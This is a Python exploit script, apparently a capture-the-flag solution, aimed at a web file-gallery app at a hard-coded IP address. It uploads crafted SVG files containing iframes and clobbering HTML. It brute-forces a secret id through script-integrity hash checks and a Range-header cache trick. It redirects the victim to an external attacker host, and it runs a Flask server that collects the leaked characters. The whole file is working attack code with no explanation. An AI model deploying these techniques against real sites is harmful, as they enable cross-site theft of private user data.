import requests
import random
import html
import hashlib
import base64

url = "http://4.240.108.171"
img = ""
img_svg=""
r = requests.get(url)
cookies = {'sid' : r.cookies["sid"]}
def fetch_cache(keys,cookies):
    for key in keys:
      r= requests.get(url+f'/files.js?'+str(key) , cookies=cookies).text
      print(r, len(r))


def cache(key,range,cookies):
    requests.get(url+f'/files.js?{key}', cookies=cookies, headers={"Range": range})

   
   
def delete(filename,cookies):
    requests.get(url+f'/delete?file={filename}', cookies=cookies)

def upload(content,filename,cookies):
  requests.post(url+'/upload', files={'file' : (filename,content)} ,allow_redirects=False , cookies=cookies)
  return url+"/static/"+cookies["sid"]+"/"+filename


#exploit() 
    
contem = """if(top.location.origin=='http://4.240.108.171')
fileNames = JSON.parse(atob(decodeURIComponent('WyI%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8%2FYj8iLCI%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8%2FYz8iLCI%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8%2FZD8iLCI%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8%2FZT8iLCI%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8%2FZj8iLCI%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8%2FZz8iLCI%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8%2FaD8iLCJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE%2FQT8iLCJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJmbGFnLnBuZyJd'))),
id = '{}"""

know = ['',"';","FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"]
    

svg_tmp = """<svg xmlns:html="http://www.w3.org/1999/xhtml" >
{}
</svg>"""

svg_img = """<svg xmlns:html="http://www.w3.org/1999/xhtml" >
<html:img src="{}"></html:img>
</svg>"""

red_svg = """<svg xmlns:html="http://www.w3.org/1999/xhtml" >
<html:meta http-equiv="refresh" content="0; url={}"></html:meta>
</svg>"""
# 18 17 16 15 14 13 12 11 10  9  8  7  6  5  4  3  2  1   
# 81 4a e0 c0 -c e8 4- 42 65 -b 20 9- 15 52 06 a2 51 3d
key_map = {

    '7' : True,
    '9' : False,
    '12' : True,
    '14' : False
    }

def gen_hashes(key):
  html_pay ="""
<script integrity="sha256-{b}" src="/files.js?{key}"></script>
<a id="id" href="abc:asdf">asdff</a>
<a id="fileNames" href="asd:asdf/../../../../../static/{image}?{cha}">fasd</a>
<a id="fileNames" href="asd:asdf">fwe</a>
<div class="gallery row">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script> 
<script src="/main.js"></script>
""".replace('\n','')
  
  hexchars = '0123456789abcdef'
  global know,contem,img
  image = "/".join(img.split('/')[-2:])
  a =[]
  if key in key_map:
     for i in hexchars:
        t = i+'-' if key_map[key] else '-'+i
        c = contem.format(t+''.join(know))
        h = hashlib.sha256(c.encode()).digest()
        b = base64.b64encode(h).decode()
        a.append(html_pay.format(b=b,key=key,image=image,cha=key+t)) 
  else:      
    for i in hexchars:
        for j in hexchars:
            c = contem.format(i+j+''.join(know))
            # print(c)
            h = hashlib.sha256(c.encode()).digest()
            b = base64.b64encode(h).decode()
            a.append(html_pay.format(b=b,key=key,image=image,cha=key+i+j))
  s = list(map(iframe,map(html.escape,a)))
  svgs = []
  if key not in key_map:
        for i in range(0,256,64):
            tem = ''.join(s[i:i+64])
            svgs.append(svg_tmp.format(tem))
  else:
        svgs.append(svg_tmp.format(s))
  return svgs
      

def iframe(srcdoc):
   return f"""<html:iframe srcdoc='{srcdoc}'></html:iframe>"""
  



from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return open('a.html').read()

@app.route('/log')
def about():
    name = request.args.get('val','')
    if ',' in name:
       keys = name.split(',')
       print(keys)
    return  "Hi"

@app.route('/found')
def found():
    name = request.args.get('val')
    global know
    know[0] = name+know[0]
    know[2] = know[2][2:]
    print(know)
    return "Found"

@app.route('/get')
def get():
    key = request.args.get('key')
    svgs = gen_hashes(key)
    urls = []
    global cookies
    for i,svg in enumerate(svgs):
        urls.append(upload(svg,f'file{i}.svg',cookies))
    
    # print(urls)
    return ','.join(urls)

@app.route('/image')
def image():
    global img
    print(img)
    return img

@app.route('/test')
def test():
    global img_svg
    print(img_svg)
    return img_svg

if __name__ == '__main__':
    # img = input("Enter the image url: ")
    img = "http://4.240.108.171/static/2ae7787b-7a17-4742-84dd-53b10365ff5b/IMG_20200716_195953.jpg"
    # red_url = input("Enter the redirect url: ")
    red_url = "http://20.235.244.64:8000/"
    print(upload(red_svg.format(red_url),'red.svg',cookies))
    app.run(port=8000,host="0.0.0.0")